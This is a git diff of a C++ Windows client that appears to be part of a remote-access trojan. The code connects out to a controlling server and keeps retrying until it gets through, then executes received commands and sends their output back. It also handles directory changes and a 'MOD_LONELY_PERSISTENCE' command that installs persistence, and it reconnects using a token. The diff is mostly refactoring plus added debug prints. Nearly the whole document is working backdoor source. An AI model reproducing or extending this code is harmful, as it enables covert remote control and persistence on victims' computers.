@@ -1,6 +1,5 @@
 #include "../inc/Connexion.h"
 #include "../inc/common.h"
-#include "../inc/ModShell.h"
 #include "../inc/Persistence.h"
 #include "../inc/other.h"
 
@@ -39,10 +38,11 @@ int Connexion::openConnexion()
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
     
+    cout << "TIMEOUT__>" << TIMEOUT << endl;
     while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
         Sleep(TIMEOUT);
-        //cout << "Whait...." <<endl;  
+        cout << "Whait...." <<endl;  
     } 
     return 0;
 }
@@ -107,99 +107,90 @@ int Connexion::main(bool is_admin, string path_prog)
     char buffer[BUFFER_LEN];
     string command,result;
     int len_recv=0;    
-    ModShell mod_shell;
+    
     while(true)
     {
         //len_recv = recv(sock_client,buffer,sizeof(buffer), 0);
         //command.append(buffer,len_recv); 
         cout << "IN main client " << endl;
-        cout << a_token << endl;
+
         recvSafe(command,i);
+        
 
         cout << "command in main ---->" << command <<"<------------"<<endl;
         cout << "command in main ---->" << command.length() <<"<------------"<<endl;
-        if(command.length() > 20)
-        {
-            cout << "len > 20" << endl;
 
-            cout << command.substr(0,15) << endl;
-            cout << command.substr(16,24)<< endl;
-        }
-        //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
-        if(command=="exit")//change 
+        if(command.find("is_life?") != string::npos)
         {
-            break;
-        }
-        else if (command.empty())
-        {
-            //Connection is down.
-            cout << "NADA" << endl;
-            //Beug ? 
-        }
-        else if(command == "is_life?")
-        {
-            ;//is life
-        }
-        else if(command.substr(0,2)=="cd")
-        {
-           ////cout << "Change directory" <<endl;
-            if(mod_shell.changeDirectory(command))
-            {
-                result = "Error when changing folder.";
-            }
-            else
-            {
-                result = mod_shell.getPath();   
-            }
-            //send(sock_client,result.c_str(),strlen(result.c_str()),0);
-            sendSafe(result);
-        }
-        else if(command.substr(0,8)=="MOD_ALL:")
-        {
-            if(mod_shell.exec(command.substr(8,command.length()),result))
-            {
-                ;
-                //Error in exec.
-            }
-            else
-            {
-                ;//Good !
-            }
-        }
-        else if (command.substr(0,15) =="MOD_PERSISTENCE:")  
-        {
-            //In mod persistence.
-            cout << "MOD_PERSISTENCE \n\n\n" << endl;
-            Persistence persistence(is_admin, path_prog);
-            cout <<"STLEN OF command.substr(16,24)" << command.substr(16,24) << endl;
-            if(command.substr(16,24) =="default")
-            {
-                cout << "Default persi" << endl;
-                persistence.defaultPersi();
-                cout << "[+] Persi ok " << endl;
-            }
+            cout << "is life find baby" << endl; // if find is_life then continue
         }
         else
         {
-            if(mod_shell.exec(command,result))
+            if(command.length() > 20)
             {
-                //cout << "error in Connexion.cpp" <<endl;
-                ;
-                //Error in exec.
+                string juan = "juan";
+                cout << "len > 20" << endl;
+                cout << "TESST JUAN" << command.substr(0,4)<< endl;
+                cout << command.substr(0,22) << endl;
+                cout <<"STLEN OF  command.substr(23,command.length())" << command.substr(23,command.length()) << endl;
+            }
+            //cout << "command in main ---->" << command.substr(0,command.length()-1) <<"<------------"<<endl;
+            if(command=="exit")//change 
+            {
+                break;
+            }
+            else if (command.empty())
+            {
+                //Connection is down.
+                cout << "NADA" << endl;
+                //Beug ? 
+            }
+            else if(command.substr(0,2)=="cd")
+            {
+            ////cout << "Change directory" <<endl;
+                if(changeDirectory(command))
+                {
+                    result = "Error when changing folder.";
+                }
+                else
+                {
+                    result = getPath();   
+                }
+                //send(sock_client,result.c_str(),strlen(result.c_str()),0);
+                sendSafe(result);
+            }
+            else if(command.substr(0,8)=="MOD_ALL:")
+            {
+                exec(command.substr(8,command.length()));
+                
+            }
+            else if (command.substr(0,23) =="MOD_LONELY_PERSISTENCE:")  
+            {
+                //In mod persistence.
+                cout << "MOD_PERSISTENCE \n\n\n" << endl;
+                Persistence persistence(is_admin, path_prog);
+                cout <<"STLEN OF  command.substr(23,command.length())" << command.substr(23,command.length()) << endl;
+                
+                if(command.substr(23,command.length()) =="default")
+                {
+                    cout << "Default persi" << endl;
+                    persistence.main();
+                    cout << "[+] Persi ok " << endl;
+                }
+                cout << "send " << endl;
+                sendSafe("\r\n"); //allows to send a confirmation to the server 
             }
             else
             {
+                result = exec(command);
                 cout << result << endl;
                 cout << result.length() <<endl;
-                result += mod_shell.getPath();
+                result += getPath();
+                
+                sendSafe(result);
+                //cout << "Command send wala" << endl; 
+                
             }
-            //cout << "String: "<< command << endl;
-            //cout << "Size string " << command.length() << endl;
-            //send(sock_client,result.c_str(),strlen(result.c_str()),0);
-            //cout << "command --->" << command << endl;
-            sendSafe(result);
-            //cout << "Command send wala" << endl; 
-            
         }
         command.erase();
         result.erase();
@@ -211,6 +202,8 @@ int Connexion::main(bool is_admin, string path_prog)
 }
 int Connexion::recvSafe(string &command,int i)
 {
+
+
     char buffer[BUFFER_LEN];
     int len_recv=recv(sock_client,buffer,sizeof(buffer),0);
 
@@ -235,6 +228,7 @@ int Connexion::recvSafe(string &command,int i)
             reConnect();
         }
     }
+    
     return 0;
 }
 void Connexion::checkSend(int &iResult)
@@ -270,24 +264,15 @@ int Connexion::closeConnexion()
 
 void Connexion::reConnect()
 {
-    cout << "[+] Reconnect to server..." << endl;
-    /*
-    if(a_token.empty())
-    {
-        //If the client does not have a token then a new connection with handshake.
-        cout << "TOKKEN EMPTY" << endl;
-        a_token = TOKEN;
-        //?????
-    }
-    */
-   
+    cout << "[+] Reconnect to server..." << endl;  
     //if the client has a token then reconnects without handshaking
     openConnexion();
     //cout << "[+] Send MOD_RECONNECT to server " << endl;
     //sendUltraSafe(sock_client, "MOD_RECONNECT");
     //cout << "[+] Send tokken to server " << endl;
-    sendUltraSafe(sock_client,"MOD_RECONNECT" SPLIT + a_token); //send token
+    sendUltraSafe(sock_client,"MOD_RECONNECT" SPLIT  TOKEN); //send token
     cout << "[+] Send tokken to server " << endl;
+   
     sendUltraSafe(sock_client, "\r\n");
     //system("PAUSE");
     
